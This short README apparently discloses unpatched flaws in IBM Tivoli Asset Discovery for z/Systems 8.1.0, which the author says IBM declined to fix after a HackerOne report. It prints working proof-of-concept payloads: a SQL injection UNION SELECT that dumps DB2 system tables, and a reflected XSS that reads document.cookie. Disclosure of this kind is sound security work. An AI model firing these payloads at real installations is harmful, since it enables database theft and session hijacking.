# IBMZseriesHacks


I responsibly disclosed these issues to IBM on hackerOne, but unfortunately their answer indicated they are not going to fix them. 

### SQL Injection on Tivoli Asset Discovery for z/Systems version 8.1.0:
I discovered that the many pages of IBM Tivoli Asset Discovery are vulnerable to SQL injection.
<br>
POC on 'lpar_resources' page:
<br>
<br>
Detection:
```
http://example.com/asset/lpar_resources?monthfrom=&monthto=&machine=x%2527)%253B+--&repository=repo&outfmt=
```
Payload on the 'machine' parameter:
```
x') union select 0,creator,dbname,name,'0','0','0','0','0','0','0','0','0','0','0','0','0','0','0','2018-08-01','0' from sysibm.systables; --
```

### Reflected XSS on Tivoli Asset Discovery for z/Systems version 8.1.0:
Like the SQL Injection, this occurs on many pages and many parameters in the application.
<br>
A POC on 'lpar_resources' page:
<br>
<br>
Payload:
```
%22%3Cimg src=1+onerror=alert(document.cookie)%3E
```
In the full URL:
```
http://example.com/disc/product_library_usage?monthfrom=&monthto=&system=&vendor=&prodrel=&repository=repo&outfmt=&library=2%22%3Cimg+src=1+onerror=alert(document.cookie)%3E&library_casei=&volume=&showoption=off&exclunknown=off&outlimit=1000
```
